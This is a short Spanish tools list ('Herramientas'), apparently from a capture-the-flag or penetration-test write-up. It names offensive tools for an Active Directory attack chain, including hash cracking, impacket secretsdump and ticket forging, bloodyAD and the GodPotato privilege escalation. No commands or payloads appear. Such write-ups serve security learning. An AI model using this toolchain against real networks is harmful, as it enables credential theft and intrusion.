**Herramientas:** `nmap` · `curl` · `python3 / requests` · `hashcat` · `sshpass` · `ssh -D` · `proxychains4` · `git` · `Gitea API` · `netexec (nxc)` · `impacket (secretsdump · lookupsid · ticketer · getST · smbconnection)` · `bloodyAD` · `kinit / faketime` · `GodPotato-NET4` · `base64 / iconv`

{% endraw %}
